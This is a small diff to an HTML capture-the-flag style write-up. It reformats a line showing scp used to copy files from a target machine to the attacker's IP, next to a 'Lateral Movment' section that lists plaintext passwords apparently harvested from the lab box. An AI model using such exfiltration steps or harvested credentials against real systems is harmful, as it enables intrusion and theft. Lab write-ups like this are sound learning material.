@@ -136,8 +136,8 @@ published: true
 <p>You can download the files with more than way, use what you like</p>
 <p>In my case i used SCP to get the files</p>
 
-<h5>Usage :</h5>
-<p>scp "file you want to download" user@0.0.0.0:path "Your ip and where you want to download it"</p> 
+<h5>Usage : <p>scp "file you want to download" user@0.0.0.0:path "Your ip and where you want to download it"</p> </h5>
+
 
 <h1>Lateral Movment</h1>
 <p>After downloading the files look What i got !</p>
@@ -145,6 +145,8 @@ published: true
 <pre><span class="line">juliette: jUli901./())!</span><br><span class="line">development: fN3)sN5Ee@g</span><br><span class="line">administrator: [MOVED]</span><br></pre>
 
 <img src="https://www.gifcen.com/wp-content/uploads/2021/04/wow-gif-6.gif" alt="sqliite" border="0">
+
+
 
 
 
